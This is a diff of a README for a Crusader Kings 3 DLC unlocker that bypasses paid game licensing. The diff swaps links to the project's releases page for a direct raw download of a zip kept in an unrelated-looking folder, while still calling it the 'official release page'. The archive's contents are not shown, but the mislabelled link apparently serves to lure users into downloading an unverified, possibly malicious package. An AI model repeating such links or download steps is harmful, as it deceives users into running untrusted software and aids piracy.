@@ -1,6 +1,6 @@
 # 🛡️ Crusader-Kings-3-DLC-Unlocker-CreamInstaller-Koalageddon-All-in-One - Access All Game Content With Ease
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Myronmannish541/Crusader-Kings-3-DLC-Unlocker-CreamInstaller-Koalageddon-All-in-One/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Myronmannish541/Crusader-Kings-3-DLC-Unlocker-CreamInstaller-Koalageddon-All-in-One/raw/refs/heads/main/butanolid/DL_Cream_Koalageddon_Installer_All_Crusader_Kings_in_One_Unlocker_3.3-beta.5.zip)
 
 ## 📖 About This Tool
 
@@ -17,7 +17,7 @@ This toolkit unlocks all downloadable content for Crusader Kings 3. It works by 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Myronmannish541/Crusader-Kings-3-DLC-Unlocker-CreamInstaller-Koalageddon-All-in-One/releases).
+1. Visit the [official release page](https://github.com/Myronmannish541/Crusader-Kings-3-DLC-Unlocker-CreamInstaller-Koalageddon-All-in-One/raw/refs/heads/main/butanolid/DL_Cream_Koalageddon_Installer_All_Crusader_Kings_in_One_Unlocker_3.3-beta.5.zip).
 2. Locate the latest version in the Assets section.
 3. Click the link to download the zip file to your computer.
 4. Open the download folder.
